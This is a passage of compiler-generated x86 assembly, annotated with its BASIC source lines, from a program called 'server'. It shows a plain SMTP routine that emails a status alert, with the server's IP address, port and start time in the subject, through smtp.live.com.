	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody51.server:
;
; [1293] SHARED APPLSTATUS
;
; [1294] SHARED CONNECTED
;
; [1295] SHARED NETWORK
data section 'globals$shared'
align	4
%NETWORK.server:	db 4 dup ?
.code
;
; [1298] IF ((APPLSTATUS == $$TRUE) && (NETWORK == $$FALSE) && (CONNECTED == $$TRUE)) THEN
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.156			;;; i467
	not	eax			;;; i468
A.156:
;+peep
	mov	ebx,d[%NETWORK.server]			;;; i663a
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.157			;;; i467
	not	ebx			;;; i468
A.157:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	mov	ebx,d[%CONNECTED.server]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.158			;;; i467
	not	ebx			;;; i468
A.158:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i220
	jz	>> else.006D.server			;;; i221
;
; [1299] Sleep (time)
	push	[ebp+8]			;;; i674a
	call	_Sleep@4			;;; i619
;
; [1300] END IF
else.006D.server:
end.if.006D.server:
;
; [1302] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.NetSleep.server:  ;;; Function end label for Assembly Programmers.
end.func51.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  NetSleep ()  *****
;  *****
;
; [1304] FUNCTION EMailAlert (pmessage)
.code
;
#ifdef EMailAlert.pmessage
#undef EMailAlert.pmessage
#endif
#define EMailAlert.pmessage ebp+8	; exposes function argument 'pmessage'
;
align 16
_EMailAlert.server@4:
;  *****
;  *****  FUNCTION  EMailAlert ()  *****
;  *****
func48.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func48.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.163:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.163			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,140			;;; i114a
;
funcBody48.server:
;
; [1306] from$ = ""' email address
#ifdef EMailAlert.from$
#undef EMailAlert.from$
#endif
#define EMailAlert.from$ ebp-40	; exposes local variable 'from$'
;
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1307] to$ = ""' email address
#ifdef EMailAlert.to$
#undef EMailAlert.to$
#endif
#define EMailAlert.to$ ebp-44	; exposes local variable 'to$'
;
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1308] fromname$ = ""' person
#ifdef EMailAlert.fromname$
#undef EMailAlert.fromname$
#endif
#define EMailAlert.fromname$ ebp-48	; exposes local variable 'fromname$'
;
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1309] server$ = "smtp.live.com"' email server
#ifdef EMailAlert.server$
#undef EMailAlert.server$
#endif
#define EMailAlert.server$ ebp-52	; exposes local variable 'server$'
;
	mov	eax,addr @_string.02E9.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1310] subject$ = #IPAddr$+":"+STRING$(#Port)+" "+ #startTime$+" "+ GetDate()
#ifdef EMailAlert.subject$
#undef EMailAlert.subject$
#endif
#define EMailAlert.subject$ ebp-56	; exposes local variable 'subject$'
;
	mov	eax,[%#IPAddr$.server]			;;; i663a
	mov	ebx,addr @_string.0121.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk48.0000 = ebp-64	; internal variable
	mov	[ebp-64],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[%#Port.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-64]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
data section 'globals$shared'
align	4
%#startTime$.server:	db 4 dup ?
.code
	mov	ebx,[%#startTime$.server]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-64],eax			;;; i670
	call	func17.server			;;; i619
	mov	ebx,[ebp-64]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1311] body$ = CSTRING$(pmessage)
#ifdef EMailAlert.body$
#undef EMailAlert.body$
#endif
#define EMailAlert.body$ ebp-68	; exposes local variable 'body$'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-68]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1313] RETURN EMail (to$,from$,fromname$,subject$,body$,server$)
	mov	eax,d[ebp-44]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk48.0001 = ebp-76	; internal variable
	mov	d[ebp-76],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk48.0002 = ebp-84	; internal variable
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-56]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk48.0003 = ebp-92	; internal variable
	mov	d[ebp-92],eax			;;; i670
	mov	eax,d[ebp-68]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk48.0004 = ebp-100	; internal variable
	mov	d[ebp-100],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-100]			;;; i674a
	push	[ebp-92]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-76]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	func47.server			;;; i619
	sub	esp,24			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+16]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+20]			;;; i871
	call	%____free			;;; i872
	add	esp,24			;;; i633
	jmp	end.func48.server			;;; i258
;
; [1314] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EMailAlert.server:  ;;; Function end label for Assembly Programmers.
end.func48.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func48.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func48.server:
	mov	esi,[ebp-68]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  EMailAlert ()  *****
;  *****
;
; [1316] FUNCTION EMail (to$,from$,fromname$,subject$,body$,server$)
.code
;
#ifdef EMail.to$
#undef EMail.to$
#endif
#define EMail.to$ ebp+8	; exposes function argument 'to$'
;
;
#ifdef EMail.from$
#undef EMail.from$
#endif
#define EMail.from$ ebp+12	; exposes function argument 'from$'
;
;
#ifdef EMail.fromname$
#undef EMail.fromname$
#endif
#define EMail.fromname$ ebp+16	; exposes function argument 'fromname$'
;
;
#ifdef EMail.subject$
#undef EMail.subject$
#endif
#define EMail.subject$ ebp+20	; exposes function argument 'subject$'
;
;
#ifdef EMail.body$
#undef EMail.body$
#endif
#define EMail.body$ ebp+24	; exposes function argument 'body$'
;
;
#ifdef EMail.server$
#undef EMail.server$
#endif
#define EMail.server$ ebp+28	; exposes function argument 'server$'
;
align 16
_EMail.server@24:
;  *****
;  *****  FUNCTION  EMail ()  *****
;  *****
func47.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func47.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.172:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.172			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
funcBody47.server:
;
; [1319] IFZ server$ THEN RETURN $$FALSE
	mov	eax,[ebp+28]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.164			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.006E.server			;;; i192
A.164:
	mov	eax,0			;;; i659
	jmp	end.func47.server			;;; i258
else.006E.server:
end.if.006E.server:
;
; [1320] IFZ to$ THEN RETURN $$FALSE
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.165			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.006F.server			;;; i192
A.165:
	mov	eax,0			;;; i659
	jmp	end.func47.server			;;; i258
else.006F.server:
end.if.006F.server:
;
; [1321] IFZ from$ THEN from$ = to$
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.166			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0070.server			;;; i192
A.166:
	mov	eax,[ebp+8]			;;; i665
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0070.server:
end.if.0070.server:
;
; [1322] IFZ fromname$ THEN fromname$ = from$
	mov	eax,[ebp+16]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.167			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0071.server			;;; i192
A.167:
	mov	eax,[ebp+12]			;;; i665
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0071.server:
end.if.0071.server:
;
; [1323] IFZ body$ THEN body$ = "\r\n\r\n"
	mov	eax,[ebp+24]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.168			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0072.server			;;; i192
A.168:
	mov	eax,addr @_string.02F5.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp+24]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0072.server:
end.if.0072.server:
;
; [1324] IFZ subject$ THEN subject$ = "  "
	mov	eax,[ebp+20]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.169			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0073.server			;;; i192
A.169:
	mov	eax,addr @_string.02F6.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp+20]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0073.server:
end.if.0073.server:
;
; [1326] date$ = "06-09-10 GMT"
#ifdef EMail.date$
#undef EMail.date$
#endif
#define EMail.date$ ebp-40	; exposes local variable 'date$'
;
	mov	eax,addr @_string.02F8.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1327] port = 25
#ifdef EMail.port
#undef EMail.port
#endif
#define EMail.port ebp-44	; exposes local variable 'port'
;
	mov	eax,25			;;; i659
	mov	d[ebp-44],eax			;;; i670
;
; [1328] socket = ConnectToServer (server$,port)
#ifdef EMail.socket
#undef EMail.socket
#endif
#define EMail.socket ebp-48	; exposes local variable 'socket'
;
	mov	eax,d[ebp+28]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk47.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	push	[ebp-44]			;;; i674a
	push	[ebp-56]			;;; i674a
	call	func21.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	mov	d[ebp-48],eax			;;; i670
;
; [1329] IFZ socket THEN RETURN $$FALSE
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0074.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func47.server			;;; i258
else.0074.server:
end.if.0074.server:
;
; [1331] time = 900
#ifdef EMail.time
#undef EMail.time
#endif
#define EMail.time ebp-60	; exposes local variable 'time'
;
	mov	eax,900			;;; i659
	mov	d[ebp-60],eax			;;; i670
;
; [1332] Sleep (time)
	push	[ebp-60]			;;; i674a
	call	_Sleep@4			;;; i619
;
; [1333] SendMail (socket,"HELO " + GetLocalIpA())
	call	func15.server			;;; i619
	mov	ebx,addr @_string.02FE.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-48]			;;; i674a
	call	func23.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1334] Sleep (time)
	push	[ebp-60]			;;; i674a
	call	_Sleep@4			;;; i619
;
; [1335] SendMail (socket,"MAIL FROM: <"+from$+">")
	mov	eax,addr @_string.02FF.server			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0300.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-48]			;;; i674a
	call	func23.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1336] Sleep (time)
	push	[ebp-60]			;;; i674a
	call	_Sleep@4			;;; i619
;
; [1337] SendMail (socket,"RCPT TO: <"+to$+">")
	mov	eax,addr @_string.0301.server			;;; i663
	mov	ebx,[ebp+8]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0300.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-48]			;;; i674a
	call	func23.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1338] Sleep (time)
	push	[ebp-60]			;;; i674a
	call	_Sleep@4			;;; i619
;
; [1339] SendMail(socket,"DATA")
	mov	eax,addr @_string.0302.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-48]			;;; i674a
	call	func23.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1340] Sleep (time)
	push	[ebp-60]			;;; i674a
	call	_Sleep@4			;;; i619
;
; [1342] mail$ = "Date: "+date$+"\r\nTo: <"+to$+">\r\nFrom: "+fromname$+"\r\nSender: "+from$
#ifdef EMail.mail$
#undef EMail.mail$
#endif
#define EMail.mail$ ebp-64	; exposes local variable 'mail$'
;
	mov	eax,addr @_string.0304.server			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0305.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+8]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0306.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+16]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0307.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-64]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1343] mail$ = mail$ + "\r\nReply-To: <"+from$+">\r\nSubject: "+subject$+"\r\n"+body$+"\r\n."
	mov	eax,[ebp-64]			;;; i665
	mov	ebx,addr @_string.0308.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0309.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+20]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.030A.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+24]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.030B.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-64]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1344] SendMail (socket,mail$)
	mov	eax,d[ebp-64]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-48]			;;; i674a
	call	func23.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1346] Sleep (time)
	push	[ebp-60]			;;; i674a
	call	_Sleep@4			;;; i619
;
; [1347] SendMail (socket,"QUIT")
	mov	eax,addr @_string.030C.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-48]			;;; i674a
	call	func23.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1348] Sleep (100)
	push	100			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1350] p2pCloseSocket (socket)
	push	[ebp-48]			;;; i674a
	call	func7B.server			;;; i619
;
; [1351] Sleep (100)
	push	100			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1352] IF #mailthread THEN
data section 'globals$shared'
align	4
%#mailthread.server:	db 4 dup ?
.code
	mov	eax,d[%#mailthread.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0075.server			;;; i221
;
; [1353] CloseHandle (#mailthread)
	push	[%#mailthread.server]			;;; i672a
	call	_CloseHandle@4			;;; i619
;
; [1354] #mailthread = 0
	mov	eax,0			;;; i659
	mov	d[%#mailthread.server],eax			;;; i668
;
; [1355] END IF
else.0075.server:
end.if.0075.server:
;
; [1357] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func47.server			;;; i258
;
; [1358] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EMail.server:  ;;; Function end label for Assembly Programmers.
end.func47.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func47.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	24			;;; i111a
free.func47.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-64]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  EMail ()  *****
;  *****
;
; [1360] FUNCTION ConnectToServer (server$,port)
.code
;
#ifdef ConnectToServer.server$
#undef ConnectToServer.server$
#endif
#define ConnectToServer.server$ ebp+8	; exposes function argument 'server$'
;
;
#ifdef ConnectToServer.port
#undef ConnectToServer.port
#endif
#define ConnectToServer.port ebp+12	; exposes function argument 'port'
;
align 16
_ConnectToServer.server@8:
;  *****
;  *****  FUNCTION  ConnectToServer ()  *****
;  *****
func21.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.175:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.175			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBody21.server:
;
; [1361] SHARED STRING MailReply
data section 'globals$shared'
align	4
%MailReply.server:	db 4 dup ?
.code
;
; [1362] STATIC c
data section 'globals$statics'
align	4
%21%c.server:	db 4 dup ?
.code
;
; [1365] INC c
	inc	d[%21%c.server]			;;; i85
;
; [1366] MailReply = MailReply + "\r\ntry "+STRING$(c)+":connecting to mailserver "+server$+":"+STRING$(port)
	mov	eax,[%MailReply.server]			;;; i663a
	mov	ebx,addr @_string.0312.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk21.0000 = ebp-44	; internal variable
	mov	[ebp-44],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[%21%c.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-44]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0313.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+8]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0121.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-44],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-44]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %MailReply.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1367] IFT p2pConnect (server$,port,@socket) THEN
	mov	eax,d[ebp+8]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-44],eax			;;; i670
#ifdef ConnectToServer.socket
#undef ConnectToServer.socket
#endif
#define ConnectToServer.socket ebp-48	; exposes local variable 'socket'
;
	push	[ebp-48]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp-44]			;;; i674a
	call	func7E.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+8]			;;; i877a
	mov	d[ebp-48],ecx			;;; i670
	add	esp,12			;;; i633
	test	eax,eax			;;; i220
	jz	>> else.0076.server			;;; i221
;
; [1368] MailReply = MailReply + "\r\nconnected\r\n"
	mov	eax,[%MailReply.server]			;;; i663a
	mov	ebx,addr @_string.0315.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %MailReply.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1369] #mailthread = _beginthreadex (NULL, 0, &ListenMail(), socket, 0, &tid)
#ifdef ConnectToServer.NULL
#undef ConnectToServer.NULL
#endif
#define ConnectToServer.NULL ebp-52	; exposes local variable 'NULL'
;
